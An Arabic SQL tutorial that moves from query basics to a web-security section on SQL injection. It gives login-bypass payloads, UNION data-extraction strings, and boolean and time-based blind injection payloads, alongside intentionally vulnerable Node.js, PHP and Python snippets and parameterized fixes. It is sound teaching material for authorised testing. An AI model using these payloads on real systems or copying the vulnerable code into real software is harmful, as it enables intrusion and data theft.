
# SQL


## ما هو SQL؟

SQL اختصار لـ Structured Query Language. هي لغة تستخدم للتعامل مع قواعد البيانات relational databases، مثل MySQL, PostgreSQL, SQL Server, و SQLite.

الفكرة ببساطة:

```text
Application -> SQL Query -> Database -> Result -> Application
```

مثلا عندما تسجل دخولك في موقع، التطبيق قد يبحث عن المستخدم داخل قاعدة البيانات باستخدام SQL.

## شكل الجدول داخل قاعدة البيانات

قاعدة البيانات تكون مقسمة إلى tables. كل table يحتوي rows و columns.

مثال table اسمه `users`:

| id | username | email | role |
|---|---|---|---|
| 1 | ahmed | ahmed@example.com | user |
| 2 | sara | test@example.com | admin |
| 3 | omar | omar@example.com | user |

في هذا المثال:

- `users` هو اسم الجدول.
- `id`, `username`, `email`, `role` هي columns.
- كل سطر هو row يمثل مستخدم.

## SELECT

`SELECT` تستخدم لقراءة بيانات من table.

مثال:

```sql
SELECT username, email
FROM users;
```

المعنى:

```text
هات username و email من جدول users
```

لو تريد كل columns:

```sql
SELECT *
FROM users;
```

> [!tip] ملاحظة
> `*` معناها كل الأعمدة، لكنها ليست دائما أفضل اختيار في التطبيقات الكبيرة لأنك قد تجلب بيانات أكثر من المطلوب.

## WHERE

`WHERE` تستخدم لتحديد شرط معين.

مثال:

```sql
SELECT *
FROM users
WHERE id = 2;
```

النتيجة المتوقعة:

| id | username | email | role |
|---|---|---|---|
| 2 | sara | test@example.com | admin |

مثال آخر:

```sql
SELECT *
FROM users
WHERE role = 'admin';
```

المعنى:

```text
هات المستخدمين الذين role عندهم admin
```

## INSERT

`INSERT` تستخدم لإضافة row جديد.

مثال:

```sql
INSERT INTO users (username, email, role)
VALUES ('mona', 'mona@example.com', 'user');
```

المعنى:

```text
أضف مستخدم جديد اسمه mona وبريده mona@example.com ودوره user
```

## UPDATE

`UPDATE` تستخدم لتعديل بيانات موجودة.

مثال:

```sql
UPDATE users
SET role = 'admin'
WHERE id = 3;
```

المعنى:

```text
غير role للمستخدم صاحب id رقم 3 إلى admin
```

> [!warning] مهم
> لا تستخدم UPDATE بدون WHERE إلا لو كنت تقصد تعديل كل rows داخل الجدول.

مثال خطر:

```sql
UPDATE users
SET role = 'admin';
```

هذا قد يجعل كل المستخدمين admins.

## DELETE

`DELETE` تستخدم لحذف rows.

مثال:

```sql
DELETE FROM users
WHERE id = 3;
```

المعنى:

```text
احذف المستخدم صاحب id رقم 3
```

> [!warning] مهم
> لا تستخدم DELETE بدون WHERE إلا لو كنت تقصد حذف كل rows من الجدول.

## ORDER BY

`ORDER BY` تستخدم لترتيب النتائج.

مثال:

```sql
SELECT *
FROM users
ORDER BY id DESC;
```

المعنى:

```text
هات المستخدمين ورتبهم حسب id من الأكبر إلى الأصغر
```

أشهر الاتجاهات:

| الكلمة | المعنى |
|---|---|
| ASC | ترتيب تصاعدي |
| DESC | ترتيب تنازلي |

## LIMIT

`LIMIT` تستخدم لتحديد عدد النتائج.

مثال:

```sql
SELECT *
FROM users
LIMIT 2;
```

المعنى:

```text
هات أول نتيجتين فقط
```

## LIKE

`LIKE` تستخدم للبحث داخل النصوص، خصوصا في search boxes.

مثال:

```sql
SELECT *
FROM users
WHERE username LIKE 'sa%';
```

المعنى:

```text
هات المستخدمين الذين username يبدأ بـ sa
```

أشهر wildcards:

| الرمز | المعنى |
|---|---|
| `%` | أي عدد من الحروف |
| `_` | حرف واحد فقط |

أمثلة:

```sql
WHERE email LIKE '%@example.com'
WHERE username LIKE '_ara'
WHERE username LIKE '%admin%'
```

> [!tip] ملاحظة
> في التطبيقات، search input يجب أن يمر كـ parameter مثل باقي القيم، حتى لو كان داخل `LIKE`.

مثال آمن كفكرة:

```text
SELECT * FROM products WHERE name LIKE ?
value = "%phone%"
```

## AND و OR

`AND` و `OR` تستخدم لدمج أكثر من شرط داخل `WHERE`.

مثال `AND`:

```sql
SELECT *
FROM users
WHERE role = 'admin'
AND id = 2;
```

المعنى:

```text
هات users الذين role = admin و id = 2 في نفس الوقت
```

مثال `OR`:

```sql
SELECT *
FROM users
WHERE role = 'admin'
OR role = 'moderator';
```

المعنى:

```text
هات users الذين role عندهم admin أو moderator
```

> [!warning] مهم
> فهم `AND` و `OR` مهم جدا في SQL Injection، لأن payload مثل `OR 1=1` يغير منطق الشرط ويجعله صحيحا دائما.

## COUNT و GROUP BY

`COUNT` تستخدم لحساب عدد rows.

مثال:

```sql
SELECT COUNT(*)
FROM users;
```

المعنى:

```text
هات عدد المستخدمين
```

`GROUP BY` تستخدم لتجميع النتائج حسب column.

مثال:

```sql
SELECT role, COUNT(*)
FROM users
GROUP BY role;
```

نتيجة متوقعة:

| role | count |
|---|---|
| admin | 1 |
| user | 2 |

هذا مفيد في التقارير والإحصائيات داخل التطبيقات.

## JOIN

`JOIN` تستخدم لربط أكثر من table مع بعض.

مثال table اسمه `orders`:

| id | user_id | total |
|---|---|---|
| 1 | 2 | 150 |
| 2 | 3 | 80 |

لو تريد تعرض الطلب مع اسم المستخدم:

```sql
SELECT users.username, orders.total
FROM orders
JOIN users ON orders.user_id = users.id;
```

المعنى:

```text
اربط orders مع users عندما orders.user_id يساوي users.id
```

نتيجة متوقعة:

| username | total |
|---|---|
| sara | 150 |
| omar | 80 |

أشهر أنواع JOIN:

| النوع | المعنى |
|---|---|
| INNER JOIN / JOIN | يرجع rows التي لها match في الجدولين |
| LEFT JOIN | يرجع كل rows من الجدول اليسار حتى لو لا يوجد match |
| RIGHT JOIN | يرجع كل rows من الجدول اليمين حتى لو لا يوجد match |

## Primary Key و Foreign Key

`Primary Key` هو column يميز كل row عن غيره، مثل `id`.

مثال:

```text
users.id = رقم فريد لكل مستخدم
```

`Foreign Key` هو column يشير إلى row في table آخر.

مثال:

```text
orders.user_id يشير إلى users.id
```

الفائدة:

- تنظيم العلاقة بين الجداول.
- تقليل البيانات المكررة.
- منع وجود order لمستخدم غير موجود.
- تسهيل فهم schema أثناء مراجعة التطبيق.

## Constraints مهمة

Constraints هي قواعد تضعها على columns حتى تحافظ على جودة البيانات.

| Constraint | المعنى |
|---|---|
| `NOT NULL` | القيمة لا يمكن أن تكون فارغة |
| `UNIQUE` | القيمة لا تتكرر |
| `PRIMARY KEY` | قيمة فريدة تحدد كل row |
| `FOREIGN KEY` | علاقة مع table آخر |
| `DEFAULT` | قيمة افتراضية لو لم يتم إرسال قيمة |
| `CHECK` | شرط لازم يتحقق |

مثال:

```sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY,
  email TEXT UNIQUE NOT NULL,
  role TEXT DEFAULT 'user'
);
```

## Transactions

Transaction تعني تنفيذ أكثر من query كعملية واحدة.

الفكرة:

```text
إما كل الخطوات تنجح
أو كل شيء يرجع كما كان
```

مثال تحويل أموال:

```text
1. اخصم 100 من حساب A
2. أضف 100 إلى حساب B
```

لو خطوة نجحت والثانية فشلت، هذا خطر. لذلك تستخدم transaction.

شكل عام:

```sql
BEGIN;

UPDATE accounts
SET balance = balance - 100
WHERE id = 1;

UPDATE accounts
SET balance = balance + 100
WHERE id = 2;

COMMIT;
```

لو حصل خطأ:

```sql
ROLLBACK;
```

> [!tip] ملاحظة
> Transactions مهمة في payments, orders, wallet, booking, وأي flow فيه أكثر من تعديل مرتبط ببعض.

## مثال Login بسيط

تطبيق login قد يحتاج يبحث عن user باستخدام email.

مثال query:

```sql
SELECT id, username, role
FROM users
WHERE email = 'sara@example.com';
```

لو وجد المستخدم، التطبيق يكمل خطوات التحقق من كلمة المرور بطريقة آمنة داخل backend.

> [!warning] مهم أمنيا
> لا تبني query عن طريق لصق input المستخدم مباشرة داخل SQL. الأفضل استخدام parameterized queries أو prepared statements لتقليل خطر SQL Injection.

مثال فكرة آمنة بشكل عام:

```text
SELECT id, username, role
FROM users
WHERE email = ?
```

علامة `?` تكون مكان قيمة يمررها التطبيق بطريقة آمنة، بدل لصقها كنص داخل query.

## مشاكل أمنية ممكن تظهر مع SQL

عندما التطبيق يستخدم SQL بطريقة غير آمنة، قد تظهر مشاكل في login, search, profile pages, admin panels, و APIs.

> [!warning] مهم
> أي اختبار لهذه المشاكل يكون فقط داخل lab أو target عندك عليه تصريح واضح. الهدف هنا فهم الفكرة وتوثيقها وإصلاحها.

## 1. Username Enumeration

Username Enumeration يعني أن التطبيق يكشف هل username أو email موجود أم لا، حتى لو كلمة المرور خطأ.

مثال رسائل خطأ غير آمنة:

```text
Email exists but password is wrong
Username not found
This account is registered
```

المشكلة أن المهاجم يستطيع يجرب قائمة emails أو usernames ويعرف الحسابات الموجودة.

مثال flow:

```text
Login with ahmed@example.com + wrong password
-> response: Wrong password

Login with random123@example.com + wrong password
-> response: User not found
```

هنا التطبيق كشف أن `ahmed@example.com` موجود.

الأفضل:

```text
Invalid email or password
```

نفس الرسالة تظهر سواء email موجود أو غير موجود.

علامات تساعدك تلاحظ Username Enumeration:

- اختلاف رسالة الخطأ.
- اختلاف status code.
- اختلاف response length.
- اختلاف وقت الرد response time.
- اختلاف redirect بعد المحاولة.
- وجود endpoint مثل `check-email` أو `forgot-password` يكشف وجود الحساب.

مثال في forgot password:

```text
If account exists, password reset instructions will be sent.
```

هذه أفضل من:

```text
This email is not registered.
```

## 2. SQL Injection في Login

SQL Injection تحصل عندما التطبيق يلصق input المستخدم مباشرة داخل query.

مثال كود developer غير آمن كفكرة:

```js
const username = req.body.username;
const password = req.body.password;

const query =
  "SELECT id, username, role FROM users " +
  "WHERE username = '" + username + "' " +
  "AND password = '" + password + "'";

db.query(query);
```

المشكلة هنا أن `username` و `password` جاءوا من المستخدم، ثم دخلوا داخل SQL كنص مباشر.

شكل query الطبيعي بعد إدخال بيانات عادية:

```sql
SELECT id, username, role
FROM users
WHERE username = 'ahmed'
AND password = '123456';
```

لو المستخدم كتب input فيه SQL syntax، قاعدة البيانات قد تفهمه كجزء من query وليس كقيمة عادية.

مثال فكرة الخطأ:

```text
username input -> يدخل داخل SQL كنص
password input -> يدخل داخل SQL كنص
database -> تنفذ query بعد التركيب
```

### مثال payload: `' OR 1=1 #`

في بيئة lab أو target مصرح، قد يستخدم المختبر payload مثل:

```text
' OR 1=1 #
```

لو وضعه في خانة username، قد تصبح query هكذا:

```sql
SELECT id, username, role
FROM users
WHERE username = '' OR 1=1 #'
AND password = 'anything';
```

شرحها:

| الجزء | المعنى |
|---|---|
| `'` | يغلق علامة الاقتباس الخاصة بقيمة username |
| `OR 1=1` | يضيف شرطا صحيحا دائما |
| `#` | comment في MySQL، يجعل باقي السطر غير منفذ |

يعني شرط password قد يتم تجاهله بسبب comment، و `OR 1=1` يجعل الشرط صحيحا.

### نفس الفكرة مع `--`

بعض قواعد البيانات تستخدم `--` للتعليق. غالبا تحتاج مسافة بعدها.

مثال:

```text
' OR 1=1 -- 
```

شكل query بعد التلاعب:

```sql
SELECT id, username, role
FROM users
WHERE username = '' OR 1=1 -- '
AND password = 'anything';
```

هنا `--` يجعل جزء password بعده comment، حسب نوع قاعدة البيانات وطريقة كتابة query.

### مثال payload مع username معروف

لو المختبر يعرف username مثل `admin`، قد يختبر الفكرة هكذا داخل lab:

```text
admin' -- 
```

شكل query:

```sql
SELECT id, username, role
FROM users
WHERE username = 'admin' -- '
AND password = 'anything';
```

الفكرة أن query تبحث عن `admin` فقط، ثم تجعل شرط password غير منفذ بسبب comment.

الخطر:

- الدخول بدون password.
- الدخول كأول user في الجدول.
- أحيانا الوصول لحساب admin إذا كان أول نتيجة أو بسبب ترتيب query.
- تسريب بيانات لو نفس المشكلة موجودة في search أو profile أو API.

> [!tip] ملاحظة
> نجاح payload يعتمد على طريقة كتابة query ونوع قاعدة البيانات وطريقة معالجة التطبيق للمدخلات. ليس كل login يقبل نفس الشكل، ووجود WAF أو prepared statements قد يمنع هذه الفكرة تماما.

## 3. ما المشكلة في كود المطور؟

المشكلة الأساسية ليست في SQL نفسها، بل في طريقة بناء query داخل backend.

علامات vulnerable code:

- استخدام string concatenation لبناء SQL.
- استخدام template string مع user input مباشرة.
- وجود `req.body`, `req.query`, `params` داخل query بدون parameterization.
- التحقق من password داخل SQL كنص عادي.
- تخزين passwords كنص واضح plain text.
- إرجاع أول row من نتيجة SQL كدليل login success بدون تحقق قوي.

مثال Node.js غير آمن:

```js
const q = `SELECT * FROM users WHERE email = '${email}' AND password = '${password}'`;
const user = await db.query(q);
```

المشكلة:

```text
email و password يتحكم بهم المستخدم
ثم يدخلون داخل SQL مباشرة
أي quote أو comment أو OR قد يغير معنى query
```

مثال PHP غير آمن:

```php
$sql = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
$result = mysqli_query($conn, $sql);
```

مثال Python غير آمن:

```py
query = "SELECT * FROM users WHERE email = '%s' AND password = '%s'" % (email, password)
cursor.execute(query)
```

## 4. كيف يكون الكود الآمن؟

الفكرة الآمنة: SQL text يبقى ثابت، وقيم المستخدم تمر منفصلة.

مثال Node.js آمن كفكرة:

```js
const q = "SELECT id, username, password_hash, role FROM users WHERE email = ?";
const rows = await db.query(q, [email]);
```

بعدها التطبيق يقارن password مع hash:

```js
const ok = await bcrypt.compare(password, rows[0].password_hash);
```

مثال PHP آمن كفكرة:

```php
$stmt = $conn->prepare("SELECT id, email, password_hash FROM users WHERE email = ?");
$stmt->bind_param("s", $email);
$stmt->execute();
```

مثال Python آمن كفكرة:

```py
cursor.execute(
    "SELECT id, email, password_hash FROM users WHERE email = ?",
    (email,)
)
```

لاحظ أن password لا يتم البحث عنه كنص داخل SQL. الصحيح غالبا:

```text
1. ابحث عن المستخدم بالـ email باستخدام prepared statement.
2. هات password_hash من database.
3. قارن password الذي أدخله المستخدم مع hash باستخدام bcrypt أو Argon2.
4. لو المقارنة صحيحة، أنشئ session.
```

## 5. Authentication Bypass

Authentication Bypass يعني فتح حساب أو صفحة محمية بدون التحقق الصحيح من الهوية.

في SQL، أشهر سبب هو أن شرط login يصبح ضعيف أو قابل للتلاعب.

مثال منطقي:

```text
الطبيعي:
username صحيح AND password صحيح -> login success

الخطأ:
username شرطه أصبح true بطريقة غير آمنة -> login success بدون password صحيح
```

أمثلة أماكن قد يظهر فيها bypass:

- Login form.
- Admin login.
- API login endpoint.
- Mobile app API.
- SSO callback لو فيه logic خطأ.
- Reset password flow لو يتحقق من المستخدم بطريقة ضعيفة.

تأثيره في report:

```text
Impact: attacker can access an account without knowing the valid password.
```

## 6. Error Based SQL Injection

أحيانا التطبيق يعرض error من قاعدة البيانات للمستخدم.

مثال رسائل خطأ حساسة:

```text
You have an error in your SQL syntax
PostgreSQL query failed
ODBC SQL Server Driver error
SQLite syntax error
```

هذه الرسائل مهمة لأنها تكشف:

- نوع قاعدة البيانات.
- أن input دخل داخل SQL.
- مكان الخطأ في query.
- أحيانا أسماء tables أو columns.

الأفضل أن التطبيق يعرض رسالة عامة للمستخدم، ويسجل التفاصيل في server logs فقط.

## 7. UNION Based SQL Injection

`UNION` في SQL تستخدم لدمج نتيجة `SELECT` مع نتيجة `SELECT` أخرى.

مثال طبيعي:

```sql
SELECT username, email
FROM users
UNION
SELECT name, contact_email
FROM customers;
```

المعنى:

```text
هات username/email من users
واضف عليهم name/contact_email من customers
```

في SQL Injection، لو parameter داخل query vulnerable، قد يحاول المختبر يضيف `UNION SELECT` حتى يجعل قاعدة البيانات ترجع بيانات من table آخر.

> [!warning] مهم
> أمثلة UNION هنا تعليمية لفهم الفكرة داخل lab أو scope مصرح فقط. لا تستخدمها على أي نظام بدون إذن واضح.

### مثال كود vulnerable في صفحة product

مثال developer code غير آمن:

```js
const id = req.query.id;

const query =
  "SELECT name, price, description FROM products " +
  "WHERE id = " + id;

db.query(query);
```

لو المستخدم فتح:

```text
/product?id=5
```

تصبح query:

```sql
SELECT name, price, description
FROM products
WHERE id = 5;
```

المشكلة أن `id` دخل داخل SQL مباشرة. لو المختبر غير `id`، قد يغير معنى query.

### شرط مهم: عدد الأعمدة

حتى يعمل `UNION`، لازم عدد columns في أول `SELECT` يساوي عدد columns في `UNION SELECT`.

في المثال السابق:

```sql
SELECT name, price, description
FROM products
WHERE id = 5;
```

عدد الأعمدة = 3:

```text
name
price
description
```

إذن `UNION SELECT` لازم يرجع 3 values أيضا.

مثال تعليمي:

```text
5 UNION SELECT 'a','b','c'
```

شكل query بعد التركيب:

```sql
SELECT name, price, description
FROM products
WHERE id = 5 UNION SELECT 'a','b','c';
```

لو ظهرت `a`, `b`, أو `c` في الصفحة، فهذا يعني أن نتيجة `UNION SELECT` تظهر في response.

### معرفة عدد الأعمدة

طريقة تعليمية داخل lab:

```text
5 ORDER BY 1
5 ORDER BY 2
5 ORDER BY 3
5 ORDER BY 4
```

الفكرة:

- إذا `ORDER BY 3` يعمل.
- و `ORDER BY 4` يعطي error.
- غالبا عدد الأعمدة في query هو 3.

مثال error قد يظهر:

```text
Unknown column '4' in 'order clause'
```

طريقة أخرى:

```text
5 UNION SELECT NULL
5 UNION SELECT NULL,NULL
5 UNION SELECT NULL,NULL,NULL
```

لو query الأصلية ترجع 3 columns، فغالبا payload بثلاث `NULL` يكون أقرب للعمل.

### شرط مهم: نوع البيانات

ليس فقط عدد columns مهم. أحيانا نوع البيانات مهم أيضا.

مثال:

```text
name -> text
price -> number
description -> text
```

لو وضعت text مكان number قد يظهر error في بعض قواعد البيانات.

لذلك يستخدم المختبر `NULL` كثيرا لأن أغلب قواعد البيانات تقبله مكان أنواع كثيرة:

```text
5 UNION SELECT NULL,NULL,NULL
```

ثم يبدل `NULL` بقيمة واضحة لمعرفة أي column تظهر في الصفحة:

```text
5 UNION SELECT 'test1',NULL,NULL
5 UNION SELECT NULL,'test2',NULL
5 UNION SELECT NULL,NULL,'test3'
```

### مثال استخراج بيانات داخل lab

لو query الأصلية فيها 3 columns، والعمود الأول والثالث يظهران في الصفحة، قد يكون المثال التعليمي:

```text
5 UNION SELECT username,NULL,email FROM users
```

شكل query:

```sql
SELECT name, price, description
FROM products
WHERE id = 5 UNION SELECT username,NULL,email FROM users;
```

الفكرة أن الصفحة التي كانت تعرض product قد تبدأ تعرض `username` و `email` من جدول `users`.

الخطر:

- تسريب usernames و emails.
- تسريب بيانات حساسة من tables أخرى.
- أحيانا معرفة أسماء tables و columns.
- قد يتطور التأثير حسب صلاحيات مستخدم قاعدة البيانات.

### مثال مع comment

لو query الأصلية تكمل بعدها شروط أخرى، يستخدم المختبر comment داخل lab حتى يوقف باقي query.

مثال:

```text
5 UNION SELECT username,NULL,email FROM users -- 
```

أو في MySQL:

```text
5 UNION SELECT username,NULL,email FROM users #
```

### كيف تعرف أن UNION نجح؟

علامات النجاح:

- ظهور قيم الاختبار مثل `test1`.
- ظهور بيانات مختلفة عن بيانات الصفحة الأصلية.
- تغير عدد النتائج في الصفحة.
- error يوضح أن عدد columns غير صحيح.
- error يوضح أن type غير مناسب.

### ما المشكلة في كود المطور؟

المشكلة غالبا تكون في query مثل:

```js
const query = "SELECT name, price, description FROM products WHERE id = " + id;
```

أو:

```php
$sql = "SELECT title, body FROM posts WHERE category = '$category'";
```

أي input من المستخدم يدخل مباشرة في `SELECT`, `WHERE`, `ORDER BY`, أو `LIMIT` قد يفتح باب SQL Injection إذا لم يتم التعامل معه صح.

الإصلاح:

```js
const query = "SELECT name, price, description FROM products WHERE id = ?";
const rows = await db.query(query, [id]);
```

مع التحقق من النوع:

```text
id لازم يكون رقم
category لازم تكون من قائمة قيم مسموحة
ORDER BY لازم يكون من whitelist وليس input مباشر
```

## 8. Blind SQL Injection

Blind SQL Injection يعني أن التطبيق vulnerable لـ SQL Injection، لكن لا يعرض database error ولا يعرض نتيجة query مباشرة في الصفحة.

بدل ما ترى البيانات، تلاحظ فرق غير مباشر مثل:

- الصفحة رجعت normal أو empty.
- response length تغير.
- status code تغير.
- redirect حصل أو لم يحصل.
- وقت الرد زاد.

الفكرة:

```text
لا أرى نتيجة SQL مباشرة
لكن أقدر أسأل قاعدة البيانات أسئلة true/false
وأفهم الإجابة من سلوك التطبيق
```

أنواع Blind SQLi المهمة:

| النوع | كيف تعرف النتيجة؟ |
|---|---|
| Boolean Based | من اختلاف محتوى الصفحة أو response |
| Time Based | من تأخر response |
| Conditional Error | من ظهور error عند شرط معين فقط |
| Out-of-Band | من اتصال خارجي مثل DNS/HTTP في بيئات خاصة |

> [!warning] مهم
> أمثلة Blind SQLi هنا تعليمية داخل lab أو scope مصرح فقط. خصوصا time-based payloads لأنها قد تبطئ السيرفر لو استخدمت بشكل سيئ.

### Boolean Based Blind SQLi

Boolean based يعني أنك ترسل شرطين: واحد true وواحد false، ثم تقارن response.

```text
شرط صحيح -> response شكل معين
شرط خطأ -> response شكل مختلف
```

مثال vulnerable code في صفحة article:

```js
const id = req.query.id;
const query = "SELECT title, body FROM articles WHERE id = " + id;
db.query(query);
```

طلب طبيعي:

```text
/article?id=10
```

query:

```sql
SELECT title, body
FROM articles
WHERE id = 10;
```

اختبار true داخل lab:

```text
10 AND 1=1
```

query بعد التركيب:

```sql
SELECT title, body
FROM articles
WHERE id = 10 AND 1=1;
```

اختبار false:

```text
10 AND 1=2
```

query:

```sql
SELECT title, body
FROM articles
WHERE id = 10 AND 1=2;
```

لو `AND 1=1` يرجع المقال، و `AND 1=2` لا يرجع المقال، فهذا مؤشر أن input دخل داخل SQL.

مثال مع string parameter:

```text
news' AND '1'='1
news' AND '1'='2
```

الفكرة أن payload الأول true والثاني false.

ماذا تقارن؟

| المقارنة | مثال |
|---|---|
| Status code | `200` مع true و `404` مع false |
| Response length | true = `4820` bytes و false = `1200` bytes |
| كلمة في الصفحة | true يظهر `Article title` و false لا يظهر |
| Redirect | true يبقى في الصفحة و false يرجع homepage |
| JSON value | true يعطي `found: true` و false يعطي `found: false` |

مثال API:

```text
/api/article?id=10 AND 1=1
-> {"found":true,"title":"Intro"}

/api/article?id=10 AND 1=2
-> {"found":false}
```

### Boolean Based مع login أو search

في login، قد لا ترى error SQL، لكن ترى اختلافا في رسالة login أو redirect.

مثال تعليمي داخل lab:

```text
username: admin' AND '1'='1
password: anything
```

ثم:

```text
username: admin' AND '1'='2
password: anything
```

لو الأول يتصرف بشكل مختلف عن الثاني، فهذا مؤشر أن username يدخل داخل query.

في search:

```text
/search?q=test' AND '1'='1
/search?q=test' AND '1'='2
```

لو عدد النتائج أو شكل الصفحة اختلف بشكل ثابت، فهذا قد يشير إلى Boolean Based SQLi.

### Time Based Blind SQLi

Time based يعني لا يوجد فرق واضح في محتوى response، لكن يمكن ملاحظة فرق في وقت الرد. هنا أنت تسأل قاعدة البيانات: "لو الشرط صحيح، انتظر عدة ثواني".

مثال MySQL داخل lab:

```text
10 AND SLEEP(5)
```

لو query vulnerable، قد يتأخر response حوالي 5 ثواني.

مثال PostgreSQL:

```text
10; SELECT pg_sleep(5)--
```

مثال SQL Server:

```text
10; WAITFOR DELAY '00:00:05'--
```

الفكرة:

```text
لو الشرط وصل لقاعدة البيانات وتنفيذ sleep حصل
يبقى response سيتأخر
```

### Time Based مع شرط

الأقوى أن تجعل التأخير يحصل فقط لو الشرط true.

مثال MySQL تعليمي:

```text
10 AND IF(1=1,SLEEP(5),0)
```

هذا غالبا يؤخر response.

مثال false:

```text
10 AND IF(1=2,SLEEP(5),0)
```

هذا لا يجب أن يؤخر response.

مثال سؤال عن database:

```text
10 AND IF(LENGTH(DATABASE())=5,SLEEP(5),0)
```

المعنى:

```text
لو طول اسم قاعدة البيانات = 5
انتظر 5 ثواني
غير ذلك لا تنتظر
```

مثال PostgreSQL كفكرة:

```text
10 AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END IS NULL
```

مثال SQL Server كفكرة:

```text
10; IF (1=1) WAITFOR DELAY '00:00:05'--
```

> [!tip] ملاحظة
> Time based يحتاج حذر لأن بطء الشبكة الطبيعي قد يعطيك نتيجة مضللة. قارن أكثر من request، واستخدم وقت قصير، ولا تضغط على السيرفر.

### Time Based حسب قاعدة البيانات

| Database | دالة التأخير |
|---|---|
| MySQL | `SLEEP(5)` |
| PostgreSQL | `pg_sleep(5)` |
| SQL Server | `WAITFOR DELAY '00:00:05'` |
| Oracle | `DBMS_LOCK.SLEEP(5)` أو طرق مشابهة حسب الصلاحيات |

### فروق مهمة بين قواعد البيانات

ليست كل قواعد البيانات تفهم نفس syntax. أثناء التعلم أو في labs، معرفة النوع تساعدك تفهم لماذا payload يعمل في مكان ولا يعمل في مكان آخر.

| Database | Comment شائع | دمج النصوص | ملاحظة |
|---|---|---|---|
| MySQL | `#` أو `-- ` | `CONCAT(a,b)` | `DATABASE()` ترجع اسم قاعدة البيانات الحالية |
| PostgreSQL | `-- ` | `a || b` | `current_database()` ترجع اسم قاعدة البيانات الحالية |
| SQL Server | `-- ` | `a + b` | يستخدم `WAITFOR DELAY` للتأخير |
| SQLite | `-- ` | `a || b` | شائع في التطبيقات الصغيرة والموبايل |
| Oracle | `-- ` | `a || b` | كثيرا يحتاج `FROM dual` في بعض queries |

أمثلة لمعرفة version داخل lab:

```text
MySQL:      SELECT @@version
PostgreSQL: SELECT version()
SQL Server: SELECT @@version
SQLite:    SELECT sqlite_version()
Oracle:    SELECT banner FROM v$version
```

> [!tip] ملاحظة
> لا تحتاج تعرف كل syntax من البداية. المهم تفهم أن اختلاف database يغير شكل errors, comments, functions, و time delays.

### استخراج معلومة بفكرة true/false

في labs، يمكن تحويل السؤال إلى true/false.

مثال سؤال:

```text
هل أول حرف من اسم قاعدة البيانات هو a؟
```

مثال MySQL تعليمي:

```text
10 AND SUBSTRING(DATABASE(),1,1)='a'
```

لو response مثل الطبيعي، قد تكون الإجابة true. لو تغير، قد تكون false.

مثال آخر:

```text
10 AND LENGTH(DATABASE())=5
```

الفكرة أن المختبر لا يرى اسم قاعدة البيانات مباشرة، لكنه يسأل شروطا صغيرة ويستنتج الإجابة من اختلاف response.

مثال time-based لنفس الفكرة:

```text
10 AND IF(SUBSTRING(DATABASE(),1,1)='a',SLEEP(5),0)
```

المعنى:

```text
لو أول حرف من اسم database هو a
response يتأخر
لو ليس a
response يرجع طبيعي
```

### Conditional Error Based Blind SQLi

Conditional Error يعني تجعل database تعمل error فقط لو الشرط true.

الفكرة:

```text
true -> يظهر error أو response مختلف
false -> لا يظهر error
```

مثال تعليمي:

```text
10 AND (CASE WHEN (1=1) THEN 1/0 ELSE 1 END)=1
```

لو الشرط true، `1/0` قد يعمل error.

مثال false:

```text
10 AND (CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1
```

هذا لا يجب أن يعمل error لأن الشرط false.

هذا النوع يعتمد جدا على نوع قاعدة البيانات وطريقة معالجة errors داخل التطبيق.

### Out-of-Band SQLi

Out-of-Band SQLi يعني أن النتيجة لا تظهر في response ولا في الوقت، بل من اتصال خارجي مثل DNS أو HTTP.

الفكرة:

```text
payload يجعل database أو السيرفر يحاول يتصل بدومين تملكه
لو وصل DNS/HTTP request
فهذا دليل أن payload تنفذ
```

هذا النوع أقل شيوعا ويحتاج lab أو بيئة مصرح بها وأدوات مراقبة DNS/HTTP. لا تضيفه في اختبار عشوائي لأنه قد يسبب traffic خارجي غير متوقع.

### كيف تعرف أن Blind SQLi موجود؟

علامات مهمة:

- `id=10 AND 1=1` يرجع نفس الصفحة.
- `id=10 AND 1=2` يرجع صفحة فارغة أو مختلفة.
- payload فيه `SLEEP(5)` يجعل response يتأخر بوضوح.
- لا توجد database errors، لكن behavior يتغير.
- نفس الاختلاف يتكرر أكثر من مرة، وليس مرة واحدة بسبب network.
- true/false يعطيان نفس النتيجة عند prepared statements، لكن يختلفان عند vulnerable concatenation.

### أخطاء شائعة في اختبار Blind SQLi

- الاعتماد على request واحد فقط.
- استخدام time delay كبير جدا.
- عدم مقارنة baseline طبيعي قبل payload.
- نسيان أن caching قد يخفي الفرق.
- اختبار parameter ليس مستخدما في SQL أصلا.
- خلط مشكلة SQLi مع access control أو validation error.

### ما المشكلة في كود المطور؟

نفس أصل المشكلة: input يدخل داخل SQL مباشرة.

مثال:

```js
const query = "SELECT * FROM articles WHERE id = " + req.query.id;
```

أو:

```php
$sql = "SELECT * FROM products WHERE name LIKE '%$search%'";
```

حتى لو التطبيق لا يعرض errors ولا يعرض data مباشرة، ما زال vulnerable لأن قاعدة البيانات تنفذ input كجزء من query.

الإصلاح:

```js
const query = "SELECT * FROM articles WHERE id = ?";
const rows = await db.query(query, [id]);
```

ومع search:

```js
const query = "SELECT * FROM products WHERE name LIKE ?";
const rows = await db.query(query, [`%${search}%`]);
```

مع `ORDER BY` لا تستخدم input مباشرة:

```js
const allowedSort = {
  newest: "created_at",
  price: "price",
  name: "name"
};

const sortColumn = allowedSort[req.query.sort] || "created_at";
const query = `SELECT * FROM products ORDER BY ${sortColumn}`;
```

هنا لا نمرر اسم العمود من المستخدم مباشرة، بل نختاره من whitelist.

## 9. أمثلة Payloads ومعناها

هذه أمثلة تعليمية لفهم الفكرة داخل lab أو scope مصرح:

| Payload | الفكرة |
|---|---|
| `' OR 1=1 #` | يغلق النص، يجعل الشرط true، ويعلق باقي query في MySQL |
| `' OR '1'='1' -- ` | نفس الفكرة مع مقارنة نصية و comment |
| `admin' -- ` | اختيار username معروف وتعليق شرط password |
| `' OR 1=1 LIMIT 1 #` | يجعل الشرط true ويرجع نتيجة واحدة |
| `') OR ('1'='1` | يستخدم عندما تكون القيمة داخل أقواس |
| `5 UNION SELECT NULL,NULL,NULL` | اختبار UNION عندما query الأصلية ترجع 3 columns |
| `5 UNION SELECT 'test1',NULL,'test3'` | معرفة أي columns تظهر في response |
| `5 UNION SELECT username,NULL,email FROM users` | مثال lab لدمج بيانات users مع نتيجة query الأصلية |
| `10 AND 1=1` | اختبار boolean true على parameter رقمي |
| `10 AND 1=2` | اختبار boolean false ومقارنة response |
| `10 AND SLEEP(5)` | اختبار time-based في MySQL داخل lab |
